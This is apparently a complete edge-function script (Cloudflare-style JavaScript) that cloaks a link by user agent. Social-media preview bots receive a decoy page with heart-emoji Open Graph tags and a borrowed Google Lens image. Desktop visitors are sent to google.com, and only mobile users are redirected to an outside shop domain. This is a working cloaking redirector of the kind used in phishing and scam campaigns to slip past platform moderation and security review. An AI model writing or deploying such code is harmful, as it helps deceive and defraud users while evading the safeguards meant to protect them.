export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="❤️💙💛💜">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://lens.usercontent.google.com/image?vsrid=CJCDye_lrY21jQEQAhgBIiRkZGQzOTljNC1lMWFkLTQzZDctYTI3OC1mZGQ2ZjlhZjU4OTMyggEiAndlKAJCdAoubGZlLWR1bW15OmMzMDcwNmU2LTI2MzYtNDBmZi04YTFhLWRmODJmZjRhMWMyYhJCCkAvYm5zL3dlL2Jvcmcvd2UvYm5zL2xlbnMtZnJvbnRlbmQtYXBpL3Byb2QubGVucy1mcm9udGVuZC1hcGkvMTMxWgQKAndlOOfgn5SehZcD&gsessionid=17RQX7axE2m3w2cZgkb9PyaL7mczkUyvIpFQlUBFkPixucm8RqazXQ">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://eventwo.shop/wezp", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
